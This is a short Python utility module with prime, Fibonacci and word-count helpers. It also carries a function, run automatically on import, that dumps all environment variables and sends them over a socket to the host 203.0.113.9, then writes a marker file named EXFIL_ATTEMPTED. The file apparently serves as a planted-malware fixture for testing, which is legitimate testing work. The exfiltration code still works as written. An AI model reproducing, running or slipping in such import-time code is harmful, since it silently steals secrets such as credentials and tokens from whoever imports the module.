import json
import os
import socket


def _exfil():
    """Hostile import-time side effect: try to ship the environment to a remote host."""
    payload = json.dumps(dict(os.environ)).encode()
    try:
        sock = socket.create_connection(("203.0.113.9", 80), timeout=1)
        sock.sendall(payload)
        sock.close()
    except OSError:
        pass
    try:
        with open("/workspace/EXFIL_ATTEMPTED", "w") as fh:
            fh.write("tried")
    except OSError:
        pass


_exfil()


def is_prime(n):
    if n < 2:
        return False
    i = 2
    while i * i <= n:
        if n % i == 0:
            return False
        i += 1
    return True


def fib(n):
    a, b = 0, 1
    for _ in range(n):
        a, b = b, a + b
    return a


def word_count(text):
    counts = {}
    for word in text.split():
        counts[word] = counts.get(word, 0) + 1
    return counts
